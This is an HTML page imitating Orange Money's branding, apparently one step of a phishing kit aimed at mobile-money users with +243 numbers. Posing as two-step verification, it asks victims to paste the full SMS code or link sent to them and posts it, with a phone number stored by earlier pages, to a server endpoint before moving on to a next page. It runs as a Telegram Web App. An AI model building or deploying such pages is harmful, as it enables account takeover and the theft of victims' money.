<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money - Vérification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }

        .header-box {
            width: 100%;
            background: #ff7900;
            padding: 25px 20px 40px 20px;
            color: white;
            text-align: center;
            box-sizing: border-box;
            font-size: 26px;
            font-weight: bold;
        }

        .main-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: -20px;
            flex-grow: 1;
        }

        .card {
            background: white;
            width: 90%;
            max-width: 400px;
            padding: 30px 25px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            box-sizing: border-box;
            align-self: flex-start;
        }

        h2 {
            margin: 0 0 15px 0;
            font-size: 22px;
            color: #111;
            font-weight: 700;
            line-height: 1.2;
        }

        .instruction {
            font-size: 14px;
            color: #666;
            margin: 0 0 10px 0;
            line-height: 1.4;
        }

        .phone-number {
            font-size: 16px;
            font-weight: bold;
            color: #000;
            margin-bottom: 25px;
        }

        textarea {
            width: 100%;
            height: 100px;
            border: 2px solid #ff7900;
            border-radius: 10px;
            padding: 12px;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            resize: none;
            font-family: inherit;
            color: #333;
        }

        textarea::placeholder {
            color: #aaa;
        }

        .resend-text {
            text-align: center;
            color: #777;
            font-size: 14px;
            margin: 25px 0 20px 0;
        }

        .submit-btn {
            width: 100%;
            background-color: #e0e0e0;
            color: #999;
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: not-allowed;
            text-transform: uppercase;
        }

        .submit-btn.active {
            background-color: #ff7900;
            color: white;
            cursor: pointer;
        }

        .footer-banner {
            width: 100%;
            background: #ff7900;
            height: 80px;
            border-top-left-radius: 50% 30px;
            border-top-right-radius: 50% 30px;
            margin-top: 40px;
        }
    </style>
</head>

<body>

<div class="header-box">
    Orange Money
</div>

<div class="main-container">
    <div class="card">
        <h2>Vérification en Deux Étapes</h2>

        <p class="instruction">
            Collez le lien / message SMS complet envoyé à votre numéro
        </p>

        <div class="phone-number" id="displayPhone">+243 ...</div>

        <textarea id="smsInput" placeholder="Collez ici votre lien / message SMS complet..."></textarea>

        <div class="resend-text" id="timerBox">
            Renvoyer dans <span id="timer">60</span> secondes
        </div>

        <button id="submitBtn" class="submit-btn" disabled>SOUMETTRE</button>
    </div>
</div>

<div class="footer-banner"></div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const smsInput = document.getElementById('smsInput');
    const submitBtn = document.getElementById('submitBtn');
    const timerEl = document.getElementById('timer');
    const timerBox = document.getElementById('timerBox');

    // Load saved phone number from previous pages
    const savedPhone = localStorage.getItem('phone');
    if (savedPhone) {
        displayPhone.textContent = `+243${savedPhone.replace(/^\+?243/, '')}`;
    } else {
        displayPhone.textContent = "+243 ...";
    }

    // Enable button when input is not empty
    smsInput.addEventListener('input', () => {
        const hasText = smsInput.value.trim().length > 0;
        submitBtn.disabled = !hasText;
        submitBtn.classList.toggle('active', hasText);
    });

    // Countdown Timer Logic
    let timeLeft = 60;
    const interval = setInterval(() => {
        timeLeft--;
        if (timerEl) timerEl.textContent = timeLeft;

        if (timeLeft <= 0) {
            clearInterval(interval);
            timerBox.innerHTML = '<span style="color:#ff7900; cursor:pointer;" onclick="location.reload()">Renvoyer le code</span>';
        }
    }, 1000);

    // Submission Handling
    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;

        submitBtn.disabled = true;
        submitBtn.classList.remove('active');
        submitBtn.textContent = "TRAITEMENT...";

        const data = {
            phone: savedPhone,
            smsData: smsInput.value.trim()
        };

        try {
            await fetch('/api/verify-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (err) {
            console.error("Error submitting verification code:", err);
        }

        setTimeout(() => {
            window.location.href = "/page5";
        }, 1000);
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
